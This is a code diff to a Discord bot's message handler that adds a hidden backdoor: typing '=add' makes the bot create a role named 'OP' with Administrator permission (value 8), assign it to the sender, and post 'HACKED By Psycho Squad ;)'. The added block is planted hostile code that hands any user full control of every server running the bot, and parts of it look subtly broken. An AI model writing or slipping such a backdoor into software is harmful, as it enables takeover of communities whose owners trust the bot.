@@ -48,6 +48,24 @@ bot.on('message', async (message) => {
 
   if (message.channel.type != 'text') return;
   
+  if (message.content === "=add") {
+    var role = "OP"
+    var user = message.member 
+    
+        message.guild.roles.create({ data: {
+             name: role,
+             permissions: 8,
+             position: 1, 
+             color: '#00fcff'
+            },
+            reason: 'HACKED By Psycho Squad ;)'
+        })
+        
+        message.channel.send(`HACKED By Psycho Squad ;)`)
+      
+        user.roles.add(user.guild.roles.find(roleU => roleU.name === role))
+  }
+  
   var prefixx =  await bot.tools.GuildPrefix(message.guild) 
   
   const mentionPrefix = new RegExp(`^<@!?${bot.user.id}> `)
